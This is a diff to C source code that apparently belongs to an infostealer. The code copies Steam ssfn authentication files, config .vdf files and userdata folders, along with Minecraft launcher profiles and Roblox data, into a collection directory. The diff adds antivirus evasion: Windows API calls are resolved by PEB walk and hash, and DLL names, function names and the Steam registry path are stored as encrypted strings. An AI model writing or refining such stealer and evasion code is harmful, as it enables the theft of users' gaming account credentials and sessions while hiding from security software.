@@ -1,17 +1,75 @@
 #include "gaming.h"
 #include "config.h"
 #include "file_utils.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
 #include <windows.h>
 
 #ifdef ENABLE_GAMING_STEAM
 #include <string.h>
 #include <stdio.h>
 
+/* PEB-walk API resolution */
+typedef HANDLE (WINAPI *pFFA)(const char *, WIN32_FIND_DATAA *);
+typedef BOOL   (WINAPI *pFNA)(HANDLE, WIN32_FIND_DATAA *);
+typedef BOOL   (WINAPI *pFC)(HANDLE);
+typedef BOOL   (WINAPI *pCFA)(const char *, const char *, BOOL);
+typedef BOOL   (WINAPI *pCDA)(const char *, void *);
+typedef LONG   (WINAPI *pROKEA)(HKEY, const char *, DWORD, REGSAM, HKEY *);
+typedef LONG   (WINAPI *pRQVEA)(HKEY, const char *, DWORD *, DWORD *, BYTE *, DWORD *);
+typedef LONG   (WINAPI *pRCK)(HKEY);
+typedef DWORD  (WINAPI *pGEVA)(const char *, char *, DWORD);
+
+static struct {
+    pFFA   pFF;   pFNA  pFN;   pFC  pFClose;
+    pCFA   pCF;   pCDA  pCD;
+    pROKEA pROKE; pRQVEA pRQVE; pRCK pRCK;
+    pGEVA  pGEV;
+    int    ready;
+} gm_api;
+
+static int gm_ensure_api(void) {
+    if (gm_api.ready) return 1;
+    char dll[32]; char fn[32];
+    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    gm_api.pFF = (pFFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    gm_api.pFN = (pFNA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    gm_api.pFClose = (pFC)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CopyFileA, ENC_COPYFILEA_LEN, fn);
+    gm_api.pCF = (pCFA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
+    gm_api.pCD = (pCDA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetEnvironmentVariableA, ENC_GETENVIRONMENTVARIABLEA_LEN, fn);
+    gm_api.pGEV = (pGEVA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
+    void *adv = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (adv) {
+        enc_decrypt(enc_RegOpenKeyExA, ENC_REGOPENKEYEXA_LEN, fn);
+        gm_api.pROKE = (pROKEA)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+        enc_decrypt(enc_RegQueryValueExA, ENC_REGQUERYVALUEEXA_LEN, fn);
+        gm_api.pRQVE = (pRQVEA)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+        enc_decrypt(enc_RegCloseKey, ENC_REGCLOSEKEY_LEN, fn);
+        gm_api.pRCK = (pRCK)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+    }
+    if (!gm_api.pFF || !gm_api.pFN || !gm_api.pFClose ||
+        !gm_api.pCF || !gm_api.pCD || !gm_api.pGEV ||
+        !gm_api.pROKE || !gm_api.pRQVE || !gm_api.pRCK) return 0;
+    gm_api.ready = 1;
+    return 1;
+}
+
 /* ── Helpers ──────────────────────────────────────────────────── */
 
 static int ensure_dir(const char *path) {
     if (dir_exists(path)) return 0;
-    CreateDirectoryA(path, NULL);
+    gm_api.pCD(path, NULL);
     return dir_exists(path) ? 0 : -1;
 }
 
@@ -23,7 +81,7 @@ static void copy_dir_recursive(const char *src_dir, const char *dst_dir) {
     char dst[MAX_PATH];
 
     snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);
-    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    HANDLE hFind = gm_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE) return;
 
     ensure_dir(dst_dir);
@@ -38,24 +96,27 @@ static void copy_dir_recursive(const char *src_dir, const char *dst_dir) {
         } else {
             snprintf(src, sizeof(src), "%s\\%s", src_dir, fd.cFileName);
             snprintf(dst, sizeof(dst), "%s\\%s", dst_dir, fd.cFileName);
-            CopyFileA(src, dst, FALSE);
+            gm_api.pCF(src, dst, FALSE);
         }
-    } while (FindNextFileA(hFind, &fd));
+    } while (gm_api.pFN(hFind, &fd));
 
-    FindClose(hFind);
+    gm_api.pFClose(hFind);
 }
 
 /* ── Steam ────────────────────────────────────────────────────── */
 
 static int read_steam_path_from_registry(char *buf, size_t buflen) {
+    if (!gm_ensure_api()) return -1;
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+    char reg_path[32];
+    enc_decrypt(enc_reg_steam, ENC_REG_STEAM_LEN, reg_path);
+    if (gm_api.pROKE(HKEY_CURRENT_USER, reg_path, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
         return -1;
 
     DWORD type = REG_SZ;
     DWORD size = (DWORD)buflen;
-    LONG rc = RegQueryValueExA(hKey, "SteamPath", NULL, &type, (LPBYTE)buf, &size);
-    RegCloseKey(hKey);
+    LONG rc = gm_api.pRQVE(hKey, "SteamPath", NULL, &type, (LPBYTE)buf, &size);
+    gm_api.pRCK(hKey);
 
     if (rc != ERROR_SUCCESS || type != REG_SZ) return -1;
     /* Steam stores forward slashes; convert to backslashes */
@@ -72,17 +133,17 @@ static int collect_ssfn_files(const char *steam_path, const char *output_dir) {
     char dst[MAX_PATH];
 
     snprintf(pattern, sizeof(pattern), "%s\\ssfn*", steam_path);
-    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    HANDLE hFind = gm_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE) return 0;
 
     do {
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
         snprintf(src, sizeof(src), "%s\\%s", steam_path, fd.cFileName);
         snprintf(dst, sizeof(dst), "%s\\%s", output_dir, fd.cFileName);
-        CopyFileA(src, dst, FALSE);
-    } while (FindNextFileA(hFind, &fd));
+        gm_api.pCF(src, dst, FALSE);
+    } while (gm_api.pFN(hFind, &fd));
 
-    FindClose(hFind);
+    gm_api.pFClose(hFind);
     return 0;
 }
 
@@ -95,7 +156,7 @@ static int collect_vdf_files(const char *steam_path, const char *output_dir) {
 
     snprintf(config_dir, sizeof(config_dir), "%s\\config", steam_path);
     snprintf(pattern, sizeof(pattern), "%s\\*.vdf", config_dir);
-    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    HANDLE hFind = gm_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE) return 0;
 
     char dst_config[MAX_PATH];
@@ -106,10 +167,10 @@ static int collect_vdf_files(const char *steam_path, const char *output_dir) {
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
         snprintf(src, sizeof(src), "%s\\%s", config_dir, fd.cFileName);
         snprintf(dst, sizeof(dst), "%s\\%s", dst_config, fd.cFileName);
-        CopyFileA(src, dst, FALSE);
-    } while (FindNextFileA(hFind, &fd));
+        gm_api.pCF(src, dst, FALSE);
+    } while (gm_api.pFN(hFind, &fd));
 
-    FindClose(hFind);
+    gm_api.pFClose(hFind);
     return 0;
 }
 
@@ -128,7 +189,7 @@ static int collect_userdata_dirs(const char *steam_path, const char *output_dir)
     ensure_dir(userdata_dst);
 
     snprintf(pattern, sizeof(pattern), "%s\\*", userdata_src);
-    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    HANDLE hFind = gm_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE) return 0;
 
     do {
@@ -137,9 +198,9 @@ static int collect_userdata_dirs(const char *steam_path, const char *output_dir)
         snprintf(src, sizeof(src), "%s\\%s", userdata_src, fd.cFileName);
         snprintf(dst, sizeof(dst), "%s\\%s", userdata_dst, fd.cFileName);
         copy_dir_recursive(src, dst);
-    } while (FindNextFileA(hFind, &fd));
+    } while (gm_api.pFN(hFind, &fd));
 
-    FindClose(hFind);
+    gm_api.pFClose(hFind);
     return 0;
 }
 
@@ -196,7 +257,7 @@ static const struct {
 
 int gaming_collect_minecraft(const char *output_dir) {
     char appdata[MAX_PATH];
-    DWORD len = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
+    DWORD len = gm_api.pGEV("APPDATA", appdata, sizeof(appdata));
     if (len == 0 || len >= sizeof(appdata)) return -1;
 
     char dst_mc[MAX_PATH];
@@ -216,7 +277,7 @@ int gaming_collect_minecraft(const char *output_dir) {
     if (file_exists(profiles_src)) {
         char profiles_dst[MAX_PATH];
         snprintf(profiles_dst, sizeof(profiles_dst), "%s\\launcher_profiles.json", dst_mc);
-        CopyFileA(profiles_src, profiles_dst, FALSE);
+        gm_api.pCF(profiles_src, profiles_dst, FALSE);
     }
 
     /* Third-party launchers */
@@ -238,7 +299,7 @@ int gaming_collect_minecraft(const char *output_dir) {
 
 int gaming_collect_roblox(const char *output_dir) {
     char localappdata[MAX_PATH];
-    DWORD len = GetEnvironmentVariableA("LOCALAPPDATA", localappdata, sizeof(localappdata));
+    DWORD len = gm_api.pGEV("LOCALAPPDATA", localappdata, sizeof(localappdata));
     if (len == 0 || len >= sizeof(localappdata)) return -1;
 
     char roblox_src[MAX_PATH];
